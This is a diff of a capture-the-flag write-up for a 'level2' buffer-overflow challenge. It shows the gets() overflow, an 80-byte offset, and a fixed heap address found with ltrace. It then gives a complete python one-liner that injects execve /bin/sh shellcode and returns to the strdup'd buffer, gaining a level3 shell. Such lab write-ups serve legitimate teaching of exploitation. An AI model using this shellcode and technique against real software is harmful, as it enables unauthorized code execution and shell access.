@@ -4,7 +4,7 @@ disassemble main
 disassemble p
 
 there is a _gets_ function call in p()
-
+there is a call to strdup on a buffer that can be overflowed
 /------------------------------------/
 
     We can calculate the offset
@@ -21,25 +21,16 @@ there is a _gets_ function call in p()
     OFFSET: 80
 
 /------------------------------------/
+    As heap allocation is not randomized, the string will always be on the same address. (This doesn't happen on any system nowadays)
+    using ltrace we can find where strdup string is located:
 
-gdb level2:
-    b p                 ## breakpoint in p()
-    run                 ## start program
-    print system        ## get system() address in memory at runtime
-    disassemble p       ## get ret address
+    ltrace ./level2
+    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    strdup("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)           = 0x0804a008
 
-$2 = {<text variable, no debug info>} 0xb7e6b060 <system>
-0x0804853e <+106>:   ret  
+    0x0804a008 -> \x08\xa0\x04\x08
 
-we will build a string which contains the buffer size in AAA + ret + system + anything + $EXPL
-
-using ltrace we can find where strdup string is located:
-
-ltrace ./level2
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-strdup("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)           = 0x0804a008
-
-0x0804a008 -> \x08\xa0\x04\x08
+/------------------------------------/
 
 Some little shellcode found here:
 http://shell-storm.org/shellcode/files/shellcode-811.php
@@ -47,8 +38,7 @@ Length: 28 bytes
 
 The string consists of the shellcode + the rest of the buffer "AAA" + the address of the strdup'd memory.
 
-python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73" + "\x68\x68\x2f\x62\x69\x6e\x89" + "\xe3\x89\xc1\x89\xc2\xb0\x0b"+ "\xcd\x80\x31\xc0\x40\xcd\x80" + "a" * (80 - 28) +  "\x08\xa0\x04\x08" ' > /tmp/exploit
-cat /tmp/exploit - | ~/level2
+python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73" + "\x68\x68\x2f\x62\x69\x6e\x89" + "\xe3\x89\xc1\x89\xc2\xb0\x0b"+ "\xcd\x80\x31\xc0\x40\xcd\x80" + "a" * (80 - 28) +  "\x08\xa0\x04\x08" ' > /tmp/exploit ; cat /tmp/exploit - | ~/level2
 
 whoami
 level3
